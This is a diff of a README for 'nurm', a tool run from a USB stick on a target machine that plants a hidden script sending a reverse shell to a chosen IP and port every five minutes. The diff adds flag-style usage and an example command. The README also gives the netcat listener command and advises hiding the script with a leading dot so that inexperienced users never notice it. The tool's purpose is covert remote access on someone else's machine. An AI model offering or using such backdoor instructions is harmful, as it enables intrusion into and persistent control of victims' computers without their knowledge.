@@ -9,12 +9,16 @@ Once run from the usb, nurm will send the reverse shell to any ip address and po
 ## Usage
 1) Download the script to your favorite usb stick
 2) Run the script on the target machine once.  
-   **Usage(v 1.0)**: `./nurm [path] [ip address] [port]`  
-   [path] - the file that the reverse shell script will be stored  
+   **Usage(v 1.0)**: `./nurm [-a ipaddress] [-p port] [-f full-path-filename]`  
    [ip address] - the ip address that the reverse shell will be sent through.  
    [port] - the port that is used for the udp connection  
+   [full-path-filename] - the file with its full path that the reverse shell script will be stored  
 3) Use nc -lvp [port] on the ip address  
 4) The interactive shell will be sent every 5 minutes
+
+## Example
+`./nurm -a 127.168.123.98 -p 8987 -f /home/user1/.test` will create a script that will send the reverse shell to the address 127.168.123.98 at port 8987 and store the script to /home/user1/.test
+
 
 ## Precautions/ Tips
 1) Always hide the file with ".". For example, .test. This way, many unexperienced users will never be ware of the script
